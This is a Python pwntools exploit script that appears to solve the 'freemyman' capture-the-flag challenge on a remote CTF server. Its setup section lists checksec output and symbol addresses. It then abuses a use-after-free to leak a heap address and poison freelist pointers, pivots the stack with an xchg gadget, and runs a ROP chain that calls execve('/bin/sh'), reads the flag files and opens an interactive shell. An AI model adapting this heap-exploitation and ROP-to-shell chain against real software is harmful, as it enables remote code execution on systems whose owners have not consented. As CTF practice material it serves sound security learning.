#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './freemyman'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'freemyman.chal.wwctf.com', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

# req allocate (1)
# break *0x401921

# data allocate (5)
break *0x401d5b

# req delete (4)
# break *0x401bf9

'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec freemyman 
#     Arch:     amd64-64-little
#     RELRO:    No RELRO
#     Stack:    No canary found
#     NX:       NX enabled
#     PIE:      No PIE (0x400000)

# REQ_POOL @ 0x0482a38
# U_$SYSTEM_$$_OUTPUT @ 0x482f00
# FPC_THREADVAR_RELOCATE @ 0x484de0
# BASEUNIX_$$_FPEXECVE$PCHAR$PPCHAR$PPCHAR$$LONGINT @ 0x04574d0 
# U_$SYSTEM_$$_FREELISTS @ 0x484bd8 [size 0x90 is at freelist+48]
# U_$SYSTEM_$$_STDOUT @ 0x483600

def add_req(title, content):
    io.sendlineafter(b'>>', b'1')
    io.sendlineafter(b':', title)
    io.sendlineafter(b':', content)

def edit_req(idx, title, content):
    io.sendlineafter(b'>>', b'2')
    io.sendlineafter(b':', str(idx).encode())
    io.sendlineafter(b':', title)
    io.sendlineafter(b':', content)

def show_req(idx):
    io.sendlineafter(b'>>', b'3')
    io.sendlineafter(b':', str(idx).encode())

def delete_req(idx):
    io.sendlineafter(b'>>', b'4')
    io.sendlineafter(b':', str(idx).encode())

def add_data(title, content):
    io.sendlineafter(b'>>', b'5')
    io.sendlineafter(b':', title)
    io.sendlineafter(b':', content)

heap = 0x0
def exploit():
    global io
    io = initialize()

    xchg_r10_rsp = 0x000000000045c0d8 # xchg r10, rsp ; ret
    pop_rsp_rbx = 0x0000000000402ccc # pop rsp ; pop rbx ; ret
    pop_rdi_r14_r13_r12_rbx = 0x0000000000403e95 # pop rdi ; pop r14 ; pop r13 ; pop r12 ; pop rbx ; ret
    pop_rsi_r13_r12_rbx = 0x0000000000402dac # pop rsi ; pop r13 ; pop r12 ; pop rbx ; ret
    mov_rsi_rdx_syscall = 0x0000000000401e6f # mov rsi, rdx ; syscall 
    pop_rax = 0x0000000000413c23 # pop rax ; ret

    add_req(b'', b'') # 1
    add_req(b'', b'') # 2

    delete_req(1)
    delete_req(2)

    show_req(1)
    io.recvuntil(b'Title: ')
    heap = (u64(io.recv(6) + b'\x00\x00') << 8) - 0x100

    edit_req(2, b'\x00'*(7+(0x28))+p64(0x483600+0x10), b'')
    edit_req(2, p64((heap>>8)+1).ljust(0x8, b'\x00'), b'')

    add_data(b'', b'')
    add_data(b'', b'')

    add_data(cyclic(39) + p64(xchg_r10_rsp), b'')
    add_data(
        b'\x00'*7 + # padding
        flat([ # heap-0x7fb8 start of chain
            pop_rdi_r14_r13_r12_rbx,
            heap-0x7f60+0x8, # points to /bin/sh
            0x0,
            0x0,
            0x0,
            0x0,
            pop_rax,
        ]),
        ((b'\x00' * 6) # padding
        + p64(pop_rax) 
        + p64(0x3b) 
        + p64(mov_rsi_rdx_syscall) 
        + p64(heap-0x7fb8) 
        + b'/bin/sh\x00')
    )

    io.sendlineafter(b'>>', b'6')    

    io.sendline(b'cat flag*')

    log.info("heap base: %#x", heap)
    log.info("rop payload: %#x", heap+0x188)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
